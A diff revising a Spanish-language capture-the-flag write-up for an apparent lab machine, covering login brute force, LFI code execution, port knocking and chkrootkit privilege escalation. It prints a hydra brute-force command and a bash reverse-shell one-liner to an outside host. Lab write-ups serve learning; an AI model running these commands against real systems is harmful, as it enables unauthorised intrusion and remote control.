@@ -89,9 +89,7 @@ Con una simple web shell de php como por ejemplo
 
 ![](/img/Pasted%20image%2020260423190633.png)
 
-
-
-Vemos que la base de datos está en el directorio /var/tmp en Rename Database
+Vemos que la base de datos está en el directorio /var/tmp en Rename Database lo cual nos hará falta para el ataque
 ![](/img/Pasted%20image%2020260423190525.png) 
 
 ### HTTP
@@ -102,86 +100,78 @@ Mediante una pequeña trampa podemos saber que el usuario que acepta te indica s
 ![](/img/Pasted%20image%2020260423183028.png) 
 
 
-Así que haciendo fuerza bruta al login intentaremos averiguar la contraseña.
+Así que haciendo fuerza bruta al login intentaremos averiguar la contraseña
 ```bash
 hydra -l none -P /usr/share/wordlists/rockyou.txt 10.129.23.159  http-post-form
 ``` 
  
 ![](/img/Pasted%20image%2020260423183147.png) 
 
-Una vez dentro buscaremos posibles vectores de ataque
-![](Pasted%20image%2020260423183250.png) 
+Una vez dentro con las credenciales sacadas buscaremos posibles vectores de ataque
+
 ![](/img/Pasted%20image%2020260423183250.png) 
 
-Al darle al apartado de Notas veremos que tenemos una vulnerabilidad de LFI la cuál explotaremos para escuchar el payload previamente creado en la base de datos
+Al darle al apartado Notes veremos que tenemos una vulnerabilidad de LFI la cuál explotaremos para escuchar el payload previamente creado en la base de datos
 
-![](Pasted%20image%2020260423183352.png) 
 ![](/img/Pasted%20image%2020260423183352.png) 
 
 
-Ya que sabíamos previamente donde está la base de datos porque lo habíamos visto procederemos ponerlo.  Y probamos el exploit y veremos que correctamente nos ha funcionado. Ahora procederemos a conseguir una reverse shell en nuestro sistema.
- ![](Pasted%20image%2020260423190738.png)
- ![](/img/Pasted%20image%2020260423190738.png)
+Ya que sabíamos previamente donde está la base de datos porque lo podíamos ver desde el phpLite procederemos poner dicho directorio.  Y ejecutamos el exploit y veremos que correctamente nos ha funcionado. Ahora haré los pasos conseguir una reverse shell en nuestro sistema.
+  ![](/img/Pasted%20image%2020260423190738.png)
 
 Pillamos la petición mediante burpsuite y cambiamos el método de esta a POST
-![](Pasted%20image%2020260423191114.png) 
+
 ![](/img/Pasted%20image%2020260423191114.png) 
 
-Y lo cambiamos para tener iniciar la reverse shell, enviamos y esperamos. 
+Y lo cambiamos para tener iniciar la reverse shell con el payload puesto, enviamos y esperamos escuchando con nuestro programa. 
 
-![](Pasted%20image%2020260423191403.png) 
 ![](/img/Pasted%20image%2020260423191403.png) 
 
 Habremos entrado al sistema exitosamente
-
-![](Pasted%20image%2020260423191513.png) 
+ 
 ![](/img/Pasted%20image%2020260423191513.png) 
 
 Investigamos las carpetas y entramos a ssl 
 
-![](Pasted%20image%2020260423191742.png)
 ![](/img/Pasted%20image%2020260423191742.png)
 
-Entramos a secure_notes y vemos un png en el cual hacemos el comando strings, lo cuál nos muestra una private key de ssh del usuario amorois. 
+En secure_notes vemos un png en el cual hacemos el comando strings y nos muestra una private key de ssh del usuario amorois del propio sistema
 
-![](Pasted%20image%2020260423192016.png)
 ![](/img/Pasted%20image%2020260423192016.png)
 
 Sabemos que no tenía abierto ssh en el  escaneo previo así que investigo sus puertos abiertos y descubro que tiene un puerto 22 abierto
-![](Pasted%20image%2020260423192233.png) 
+
 ![](/img/Pasted%20image%2020260423192233.png) 
 
-Como no tiene ssh veremos los programas que tiene desde /etc/init.d y comprobamos que está usando knockd que es un programa que sirve para ocultar algún puerto para mayor seguridad.
-![](Pasted%20image%2020260423192747.png) 
-Como no tiene ssh veremos los programas que tiene desde /etc/init.d y comprobamos que está usando knockd que es un programa que sirve para ocultar puertos para mayor seguridad.
+Como no tiene ssh veremos los programas que tiene desde /etc/init.d y comprobamos que está usando knockd que es un programa que sirve para ocultar puertos para mayor seguridad
 ![](/img/Pasted%20image%2020260423192747.png) 
 
-En el fichero propio de configuración podemos comprobar que tiene bloqueado el puerto 22, así que debemos jugar con la secuencia dada para abrir el puerto.
-![](Pasted%20image%2020260423193024.png) 
+En el propio fichero de configuración podemos comprobar que tiene bloqueado el puerto 22, así que debemos jugar con la secuencia dada para abrir el puerto.
+
 ![](/img/Pasted%20image%2020260423193024.png) 
 
-Usaremos la propia herramienta y simplemente poniendo la secuencia podremos comprobar que se ha abierto el puerto 22 del ssh.
-![](Pasted%20image%2020260423193434.png) 
-Usaremos la herramienta knock y simplemente poniendo la secuencia podremos comprobar que se ha abierto el puerto 22 del ssh.
+Usaremos la herramienta knock y simplemente poniendo la secuencia podremos comprobar que se ha abierto el puerto 22 del ssh
 ![](/img/Pasted%20image%2020260423193434.png) 
 
 
 Así que ahora simplemente con la clave privada previamente copiada la usaremos para iniciar sesión en ssh con el usuario amrois
-
-![](Pasted%20image%2020260423193647.png) 
+ 
 ![](/img/Pasted%20image%2020260423193647.png) 
 
 Ya dentro podemos acceder a la primera flag de user.txt
+
 ![](/img/Pasted%20image%2020260423193958.png)
 ## Escalada de privilegios
 Pasé el programa de pspy (https://github.com/dominicbreuker/pspy) para ver procesos que sean interesante y identifiqué que hay un proceso de chkrootkit el cuál tiene una vulnerabilidad explotable para escalar privilegios https://www.exploit-db.com/exploits/33899
+
 ![](Pasted%20image%2020260423200654.png)
 
-Para ello debemos crear una reverseshell en /tmp que se llame update, este se ejecutara y seremos root exitosamente.
+Para ello debemos crear una reverseshell en /tmp que se llame update, este se ejecutara y seremos root exitosamente
+
 ```bash
 bash -i >& /dev/tcp/10.10.14.180/443 0>&1
 ```
 
-Así dará por concluido el laboratorio con la última flag sacada
+Esperamos y una vez ejecutado seremos root dará por concluido el laboratorio con la última flag de la máquina
 
 ![](/img/Pasted%20image%2020260423200905.png)
